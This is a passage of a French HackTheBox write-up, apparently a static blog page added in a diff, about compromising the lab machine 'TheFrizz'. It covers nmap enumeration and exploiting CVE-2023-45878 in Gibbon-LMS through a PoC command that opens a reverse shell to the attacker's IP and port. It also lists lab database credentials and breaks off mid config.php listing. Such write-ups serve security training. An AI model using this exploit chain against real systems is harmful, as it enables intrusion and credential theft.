@@ -1,0 +1,1354 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>TheFrizz - z3rodol</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/thefrizz/">
+  <meta property="og:site_name" content="z3rodol">
+  <meta property="og:title" content="TheFrizz">
+  <meta property="og:description" content="TheFrizz est une machine Windows de difficulté moyenne mettant en scène une application web représentant l’école élémentaire Walkerville et une instance de Gibbon CMS. Cette instance est vulnérable à une écriture arbitraire de fichiers non authentifiée (CVE-2023-45878), permettant d’uploader un shell PHP pour obtenir un accès initial. Une fois sur le système, un fichier de configuration de base de données révèle des identifiants MySQL, incluant un hash et un sel pour l’utilisateur f.frizzle. Après cassage du mot de passe, une authentification SSH avec GSSAPI/Kerberos est possible. En obtenant un TGT (Ticket Granting Ticket), on utilise l’authentification Kerberos pour progresser. Dans la corbeille de l’utilisateur f.frizzle, un archive 7Zip supprimée est découverte. Son extraction révèle une configuration WAPT contenant des identifiants encodés en base64 pour le compte M.Schoolbus. Ce dernier, membre du groupe Group Policy Creator Owners, permet de créer des GPOs pour élever les privilèges jusqu’à NT Authority\System.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:modified_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:tag" content="Medium">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="CVE-2023-45878">
+    <meta property="article:tag" content="SharpGPOAbuse">
+    <meta property="article:tag" content="MySQL">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="TheFrizz">
+  <meta name="twitter:description" content="TheFrizz est une machine Windows de difficulté moyenne mettant en scène une application web représentant l’école élémentaire Walkerville et une instance de Gibbon CMS. Cette instance est vulnérable à une écriture arbitraire de fichiers non authentifiée (CVE-2023-45878), permettant d’uploader un shell PHP pour obtenir un accès initial. Une fois sur le système, un fichier de configuration de base de données révèle des identifiants MySQL, incluant un hash et un sel pour l’utilisateur f.frizzle. Après cassage du mot de passe, une authentification SSH avec GSSAPI/Kerberos est possible. En obtenant un TGT (Ticket Granting Ticket), on utilise l’authentification Kerberos pour progresser. Dans la corbeille de l’utilisateur f.frizzle, un archive 7Zip supprimée est découverte. Son extraction révèle une configuration WAPT contenant des identifiants encodés en base64 pour le compte M.Schoolbus. Ce dernier, membre du groupe Group Policy Creator Owners, permet de créer des GPOs pour élever les privilèges jusqu’à NT Authority\System.">
+<meta name="application-name" content="z3rodol">
+<meta name="apple-mobile-web-app-title" content="z3rodol">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/thefrizz/" /><link rel="prev" href="http://localhost:1313/tombwatcher/" /><link rel="next" href="http://localhost:1313/shocker/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "TheFrizz",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/thefrizz\/"
+        },"genre": "posts","keywords": "Medium, Windows, Active Directory, CVE-2023-45878, SharpGPOAbuse, MySQL, SSH","wordcount":  3738 ,
+        "url": "http:\/\/localhost:1313\/thefrizz\/","datePublished": "2025-12-11T10:28:41+00:00","dateModified": "2025-12-11T10:28:41+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "z3rodol"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="z3rodol">z3rodol Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="z3rodol">z3rodol Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">TheFrizz</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://z3rodol.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>z3rodol</a></span>&nbsp;<span class="post-category">included in <a href="/categories/machines/"><i class="far fa-folder" aria-hidden="true"></i>Machines</a>&nbsp;<a href="/categories/hackthebox/"><i class="far fa-folder" aria-hidden="true"></i>Hackthebox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-11">2025-12-11</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;3738 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;18 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#enumération">Enumération</a>
+          <ul>
+            <li><a href="#nmap">Nmap</a></li>
+            <li><a href="#http---tcp-80">HTTP - TCP 80</a></li>
+          </ul>
+        </li>
+        <li><a href="#reverse-shell-en-tant-que-wwebservice">Reverse shell en tant que w.webservice</a>
+          <ul>
+            <li><a href="#cve-2023-45878">CVE-2023-45878</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-en-tant-que-ffrizzle">Shell en tant que f.frizzle</a>
+          <ul>
+            <li><a href="#mysql">MySQL</a></li>
+            <li><a href="#hashcat">Hashcat</a></li>
+            <li><a href="#bloodhound">BloodHound</a></li>
+            <li><a href="#ssh">SSH</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-en-tant-que-mschoolbus">Shell en tant que M.Schoolbus</a>
+          <ul>
+            <li><a href="#corbeille">Corbeille</a></li>
+            <li><a href="#password-spraying">Password Spraying</a></li>
+            <li><a href="#ssh-1">SSH</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-en-tant-que-system">Shell en tant que system</a>
+          <ul>
+            <li><a href="#sharpgpoabuse">SharpGPOAbuse</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TheFrizz/thefrizz.png"
+        data-srcset="/images/TheFrizz/thefrizz.png, /images/TheFrizz/thefrizz.png 1.5x, /images/TheFrizz/thefrizz.png 2x"
+        data-sizes="auto"
+        alt="/images/TheFrizz/thefrizz.png"
+        title="TheFrizz" width="665" height="307" /></p>
+<p><code>TheFrizz</code> est une machine Windows de difficulté moyenne mettant en scène une application web représentant l’école élémentaire Walkerville et une instance de <code>Gibbon CMS</code>. Cette instance est vulnérable à une écriture arbitraire de fichiers non authentifiée (<code>CVE-2023-45878</code>), permettant d’uploader un shell PHP pour obtenir un accès initial.
+Une fois sur le système, un fichier de configuration de base de données révèle des identifiants MySQL, incluant un hash et un sel pour l’utilisateur <code>f.frizzle</code>. Après cassage du mot de passe, une authentification SSH avec <code>GSSAPI/Kerberos</code> est possible. En obtenant un TGT (Ticket Granting Ticket), on utilise l’authentification Kerberos pour progresser.
+Dans la corbeille de l’utilisateur <code>f.frizzle</code>, un archive <code>7Zip</code> supprimée est découverte. Son extraction révèle une configuration <code>WAPT</code> contenant des identifiants encodés en base64 pour le compte <code>M.Schoolbus</code>. Ce dernier, membre du groupe <code>Group Policy Creator Owners</code>, permet de créer des GPOs pour élever les privilèges jusqu’à <code>NT Authority\System</code>.</p>
+<h2 id="enumération">Enumération</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Il y a plusieurs ports ouverts : <code>SSH</code>, <code>DNS</code>, <code>HTTP</code>, <code>Kerberos</code>, <code>RPC</code>, <code>LDAP</code>, <code>SMB</code>, <code>LDAPS</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root at exegol-hackthebox in /workspace/TheFrizz
+</span></span><span class="line"><span class="cl">╰─○ nmap 10.129.187.99 --min-rate <span class="m">10000</span> -vv -p-
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-15 15:42 CEST
+</span></span><span class="line"><span class="cl">&lt;snip&gt;
+</span></span><span class="line"><span class="cl">Completed SYN Stealth Scan at 15:43, 43.34s elapsed <span class="o">(</span><span class="m">65535</span> total ports<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.187.99
+</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">127</span> <span class="o">(</span>4.1s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2025-07-15 15:42:42 CEST <span class="k">for</span> 43s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65516</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE          REASON
+</span></span><span class="line"><span class="cl">22/tcp    open  ssh              syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">53/tcp    open  domain           syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">80/tcp    open  http             syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec     syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc            syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn      syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap             syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds     syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5         syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">593/tcp   open  http-rpc-epmap   syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">636/tcp   open  ldapssl          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3268/tcp  open  globalcatLDAP    syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  globalcatLDAPssl syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">9389/tcp  open  adws             syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49664/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49668/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49670/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49673/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">62152/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root at exegol-hackthebox in /workspace/TheFrizz
+</span></span><span class="line"><span class="cl">╰─○ nmap 10.129.187.99 -p 22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49664,49668,49670,49673,62152 -sV -sC
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-15 15:49 CEST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.187.99
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.034s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">22/tcp    open  ssh           OpenSSH for_Windows_9.5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">80/tcp    open  http          Apache httpd 2.4.58 <span class="o">(</span>OpenSSL/3.1.3 PHP/8.2.12<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.58 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/3.1.3 PHP/8.2.12
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-07-15 20:49:16Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: frizz.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  tcpwrapped
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: frizz.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49668/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">49673/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">62152/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Service Info: Hosts: localhost, FRIZZDC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 6h59m59s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2025-07-15T20:50:08
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   311:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required</span></span></code></pre></div></div>
+<p>J&rsquo;ajoute le nom de domaine ainsi que le FQDN dans le fichier <code>/etc/hosts</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.129.187.99 frizzdc.frizz.htb frizzdc frizz.htb&#34;</span> <span class="p">|</span> tee -a /etc/hosts</span></span></code></pre></div></div>
+<h3 id="http---tcp-80">HTTP - TCP 80</h3>
+<p>J&rsquo;arrive sur un site d’éducation.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TheFrizz/TheFrizz-1.png"
+        data-srcset="/images/TheFrizz/TheFrizz-1.png, /images/TheFrizz/TheFrizz-1.png 1.5x, /images/TheFrizz/TheFrizz-1.png 2x"
+        data-sizes="auto"
+        alt="/images/TheFrizz/TheFrizz-1.png"
+        title="/images/TheFrizz/TheFrizz-1.png" width="1920" height="924" /></p>
+<p>En cliquant sur le bouton <code>login</code>, je vois que je suis sur un site <strong><code>Gibbon-LMS</code></strong>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TheFrizz/TheFrizz-2.png"
+        data-srcset="/images/TheFrizz/TheFrizz-2.png, /images/TheFrizz/TheFrizz-2.png 1.5x, /images/TheFrizz/TheFrizz-2.png 2x"
+        data-sizes="auto"
+        alt="/images/TheFrizz/TheFrizz-2.png"
+        title="/images/TheFrizz/TheFrizz-2.png" width="1914" height="836" /></p>
+<h2 id="reverse-shell-en-tant-que-wwebservice">Reverse shell en tant que w.webservice</h2>
+<h3 id="cve-2023-45878">CVE-2023-45878</h3>
+<p>Sur <a href="https://www.cvedetails.com/cve/CVE-2023-45878/" target="_blank" rel="noopener noreffer ">cve-details</a>, je vois que cette version de <code>GIBBON-LMS</code> est vulnerable à une <strong>écriture arbitraire de fichiers</strong> conduisant à une <strong>exécution de code à distance (RCE) non authentifiée</strong>. Le fichier <strong><code>rubrics_visualise_saveAjax.php</code></strong> ne vérifie pas l&rsquo;authentification des utilisateurs.
+L&rsquo;exploitation est la suivante :</p>
+<ul>
+<li>Un attaquant peut envoyer une requête HTTP malveillante avec :
+<ul>
+<li>Un <strong><code>img</code></strong> contenant du code PHP malveillant encodé en <code>base64</code>.</li>
+<li>Un <strong><code>path</code></strong> pointant vers un emplacement accessible sur le serveur.</li>
+</ul>
+</li>
+<li>Le serveur décode le contenu de <strong><code>img</code></strong> et l&rsquo;écrit dans le fichier spécifié par <strong><code>path</code></strong>.</li>
+<li>Résultat : création d&rsquo;un fichier PHP arbitraire sur le serveur, permettant une <strong>exécution de code à distance (RCE)</strong> sans authentification.
+Je trouve alors un <a href="https://github.com/dgoorden/CVE-2023-45878" target="_blank" rel="noopener noreffer ">POC</a> permettant d&rsquo;automatiser cela. Ce qui me permet d&rsquo;avoir un shell en tant que <strong><code>w.webservice</code></strong>.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mf">45878.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">frizzdc</span><span class="o">.</span><span class="n">frizz</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">Gibbon</span><span class="o">-</span><span class="n">LMS</span> <span class="o">-</span><span class="n">l</span> <span class="mf">10.10.16.53</span> <span class="o">-</span><span class="n">p</span> <span class="mi">9001</span> <span class="o">-</span><span class="n">f</span> <span class="n">pwn</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TheFrizz/TheFrizz-3.png"
+        data-srcset="/images/TheFrizz/TheFrizz-3.png, /images/TheFrizz/TheFrizz-3.png 1.5x, /images/TheFrizz/TheFrizz-3.png 2x"
+        data-sizes="auto"
+        alt="/images/TheFrizz/TheFrizz-3.png"
+        title="/images/TheFrizz/TheFrizz-3.png" width="1375" height="735" /></p>
+<h2 id="shell-en-tant-que-ffrizzle">Shell en tant que f.frizzle</h2>
+<h3 id="mysql">MySQL</h3>
+<p>Je trouve les identifiants de la base de données <code>MrGibbonsDB:MisterGibbs!Parrot!?1</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">SHELL</span><span class="p">&gt;</span> <span class="nb">pwd
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Path</span>
+</span></span><span class="line"><span class="cl"><span class="p">----</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="nb">Gibbon-LMS</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">SHELL</span><span class="p">&gt;</span> <span class="nb">type </span><span class="n">config</span><span class="p">.</span><span class="py">php</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="k">?</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="p">/*</span>
+</span></span><span class="line"><span class="cl"><span class="n">Gibbon</span><span class="p">,</span> <span class="n">Flexible</span> <span class="p">&amp;</span> <span class="n">Open</span> <span class="n">School</span> <span class="n">System</span>
+</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mf">2010</span><span class="p">,</span> <span class="n">Ross</span> <span class="n">Parker</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">This</span> <span class="n">program</span> <span class="n">is</span> <span class="n">free</span> <span class="n">software</span><span class="err">:</span> <span class="n">you</span> <span class="n">can</span> <span class="n">redistribute</span> <span class="n">it</span> <span class="n">and</span><span class="p">/</span><span class="n">or</span> <span class="n">modify</span>
+</span></span><span class="line"><span class="cl"><span class="n">it</span> <span class="n">under</span> <span class="n">the</span> <span class="n">terms</span> <span class="n">of</span> <span class="n">the</span> <span class="n">GNU</span> <span class="n">General</span> <span class="n">Public</span> <span class="n">License</span> <span class="n">as</span> <span class="n">published</span> <span class="n">by</span>
+</span></span><span class="line"><span class="cl"><span class="n">the</span> <span class="n">Free</span> <span class="n">Software</span> <span class="n">Foundation</span><span class="p">,</span> <span class="n">either</span> <span class="n">version</span> <span class="mf">3</span> <span class="n">of</span> <span class="n">the</span> <span class="n">License</span><span class="p">,</span> <span class="n">or</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">at</span> <span class="n">your</span> <span class="n">option</span><span class="p">)</span> <span class="n">any</span> <span class="n">later</span> <span class="n">version</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">This</span> <span class="n">program</span> <span class="n">is</span> <span class="n">distributed</span> <span class="k">in</span> <span class="n">the</span> <span class="n">hope</span> <span class="n">that</span> <span class="n">it</span> <span class="n">will</span> <span class="n">be</span> <span class="n">useful</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="n">but</span> <span class="n">WITHOUT</span> <span class="n">ANY</span> <span class="n">WARRANTY</span><span class="p">;</span> <span class="n">without</span> <span class="n">even</span> <span class="n">the</span> <span class="n">implied</span> <span class="n">warranty</span> <span class="n">of</span>
+</span></span><span class="line"><span class="cl"><span class="n">MERCHANTABILITY</span> <span class="n">or</span> <span class="n">FITNESS</span> <span class="k">FOR</span> <span class="n">A</span> <span class="n">PARTICULAR</span> <span class="n">PURPOSE</span><span class="p">.</span>  <span class="n">See</span> <span class="n">the</span>
+</span></span><span class="line"><span class="cl"><span class="n">GNU</span> <span class="n">General</span> <span class="n">Public</span> <span class="n">License</span> <span class="k">for</span> <span class="n">more</span> <span class="n">details</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">You</span> <span class="n">should</span> <span class="n">have</span> <span class="n">received</span> <span class="n">a</span> <span class="nb">copy </span><span class="n">of</span> <span class="n">the</span> <span class="n">GNU</span> <span class="n">General</span> <span class="n">Public</span> <span class="n">License</span>
+</span></span><span class="line"><span class="cl"><span class="n">along</span> <span class="n">with</span> <span class="n">this</span> <span class="n">program</span><span class="p">.</span>  <span class="k">If</span> <span class="n">not</span><span class="p">,</span> <span class="n">see</span> <span class="p">&lt;</span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">www</span><span class="p">.</span><span class="py">gnu</span><span class="p">.</span><span class="n">org</span><span class="p">/</span><span class="n">licenses</span><span class="p">/&gt;.</span>
+</span></span><span class="line"><span class="cl"><span class="p">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">/**</span>
+</span></span><span class="line"><span class="cl"> <span class="p">*</span> <span class="n">Sets</span> <span class="n">the</span> <span class="n">database</span> <span class="n">connection</span> <span class="n">information</span><span class="p">.</span>
